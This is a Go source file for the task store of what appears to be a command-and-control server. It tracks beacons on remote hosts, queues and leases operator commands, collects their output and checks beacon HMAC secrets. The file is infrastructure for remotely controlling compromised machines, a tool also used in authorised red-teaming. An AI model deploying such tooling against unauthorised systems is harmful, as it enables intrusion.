// store.go — beacons, task leasing and result intake.
//
// Mirrors phantom.core.c2_server.C2State: tasks are LEASED, not deleted (a
// lost HTTP response used to lose work permanently), results are idempotent
// per task_id, and beacon secrets are read from the SAME registry file the
// Python enroler writes.
package main

import (
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"os"
	"strings"
	"sync"
	"time"
)

// TaskLeaseSeconds is how long a delivered task is withheld from redelivery.
const TaskLeaseSeconds = 60

type taskEntry struct {
	id       string
	command  string
	leasedAt time.Time
	sentAt   time.Time
}

// Store is the in-memory state of one listener process.
type Store struct {
	mu       sync.Mutex
	beacons  map[string]map[string]any
	tasks    map[string][]*taskEntry
	results  map[string][]map[string]any
	registry string
}

// NewStore returns an empty store that reads beacon secrets from registry.
func NewStore(registry string) *Store {
	return &Store{
		beacons:  map[string]map[string]any{},
		tasks:    map[string][]*taskEntry{},
		results:  map[string][]map[string]any{},
		registry: registry,
	}
}

// UpdateBeacon merges info into the beacon record (creating it if new).
func (s *Store) UpdateBeacon(beaconID string, info map[string]any) {
	s.mu.Lock()
	defer s.mu.Unlock()
	rec := s.beacons[beaconID]
	if rec == nil {
		rec = map[string]any{}
		s.beacons[beaconID] = rec
	}
	rec["beacon_id"] = beaconID
	rec["status"] = "active"
	for k, v := range info {
		if v != nil && v != "" {
			rec[k] = v
		}
	}
}

// Beacons returns a copy of the beacon table for the operator API.
func (s *Store) Beacons() map[string]map[string]any {
	s.mu.Lock()
	defer s.mu.Unlock()
	out := make(map[string]map[string]any, len(s.beacons))
	for id, rec := range s.beacons {
		cp := make(map[string]any, len(rec))
		for k, v := range rec {
			cp[k] = v
		}
		out[id] = cp
	}
	return out
}

// Registered reports whether a beacon has ever checked in.
func (s *Store) Registered(beaconID string) bool {
	s.mu.Lock()
	defer s.mu.Unlock()
	_, ok := s.beacons[beaconID]
	return ok
}

// QueueTask appends a command and returns its task id.
func (s *Store) QueueTask(beaconID, command string) (string, error) {
	if strings.TrimSpace(beaconID) == "" || strings.TrimSpace(command) == "" {
		return "", fmt.Errorf("beacon_id and command required")
	}
	if len(command) > 64*1024 {
		return "", fmt.Errorf("command too long (max 64 KiB)")
	}
	s.mu.Lock()
	defer s.mu.Unlock()
	id := newTaskID()
	s.tasks[beaconID] = append(s.tasks[beaconID],
		&taskEntry{id: id, command: command})
	return id, nil
}

// PendingTasks leases and returns the tasks to deliver now. A task inside an
// active lease is withheld; one whose lease expired is redelivered.
func (s *Store) PendingTasks(beaconID string) []map[string]any {
	s.mu.Lock()
	defer s.mu.Unlock()
	now := time.Now()
	out := []map[string]any{}
	for _, t := range s.tasks[beaconID] {
		if !t.leasedAt.IsZero() && now.Sub(t.leasedAt) < TaskLeaseSeconds*time.Second {
			continue
		}
		t.leasedAt = now
		t.sentAt = now
		out = append(out, map[string]any{
			"task_id": t.id,
			"command": t.command,
		})
	}
	return out
}

// AddResult stores a result and acknowledges (removes) its task. It is
// idempotent: a retry after a lost 200 must not duplicate the output.
func (s *Store) AddResult(beaconID, taskID, output string) {
	s.mu.Lock()
	defer s.mu.Unlock()
	for _, r := range s.results[beaconID] {
		if r["task_id"] == taskID {
			return
		}
	}
	s.results[beaconID] = append(s.results[beaconID], map[string]any{
		"task_id":   taskID,
		"output":    output,
		"timestamp": time.Now().UTC().Format(time.RFC3339),
	})
	kept := s.tasks[beaconID][:0]
	for _, t := range s.tasks[beaconID] {
		if t.id != taskID {
			kept = append(kept, t)
		}
	}
	s.tasks[beaconID] = kept
}

// Results returns the cached results for a beacon.
func (s *Store) Results(beaconID string) []map[string]any {
	s.mu.Lock()
	defer s.mu.Unlock()
	out := make([]map[string]any, 0, len(s.results[beaconID]))
	out = append(out, s.results[beaconID]...)
	return out
}

// ── beacon identity ─────────────────────────────────────────────────────

type registryRecord struct {
	Status            string          `json:"status"`
	Secret            string          `json:"secret"`
	PreviousSecret    string          `json:"previous_secret"`
	PreviousExpiresAt json.RawMessage `json:"previous_expires_at"`
}

// BeaconSecrets returns the active HMAC secret(s) for a beacon identity: the
// current one, plus the previous one while it has not expired (rotation).
func (s *Store) BeaconSecrets(beaconID string) [][]byte {
	if beaconID == "" {
		return nil
	}
	raw, err := os.ReadFile(s.registry)
	if err != nil {
		return nil
	}
	var reg struct {
		Beacons map[string]registryRecord `json:"beacons"`
	}
	if err := json.Unmarshal(raw, &reg); err != nil {
		return nil
	}
	rec, ok := reg.Beacons[beaconID]
	if !ok || rec.Status != "active" {
		return nil
	}
	var out [][]byte
	if b := decodeSecret(rec.Secret); b != nil {
		out = append(out, b)
	}
	if b := decodeSecret(rec.PreviousSecret); b != nil && !previousExpired(rec.PreviousExpiresAt) {
		out = append(out, b)
	}
	return out
}

func previousExpired(raw json.RawMessage) bool {
	if len(raw) == 0 || string(raw) == "null" {
		return true
	}
	var ts float64
	if err := json.Unmarshal(raw, &ts); err != nil {
		return true
	}
	return ts > 0 && float64(time.Now().Unix()) > ts
}

// decodeSecret unwraps the URL-safe, unpadded base64 the Python enroler
// writes, requiring exactly 32 bytes.
func decodeSecret(value string) []byte {
	if value == "" {
		return nil
	}
	if b, err := base64.RawURLEncoding.DecodeString(strings.TrimRight(value, "=")); err == nil {
		if len(b) == 32 {
			return b
		}
	}
	return nil
}

// newTaskID mirrors the Python format: timestamp + random suffix, so two
// enqueues in the same microsecond cannot collide.
func newTaskID() string {
	now := time.Now()
	suffix := make([]byte, 4)
	_, _ = rand.Read(suffix)
	return fmt.Sprintf("%s%06d-%s", now.Format("20060102150405"),
		now.Nanosecond()/1000, hex.EncodeToString(suffix))
}
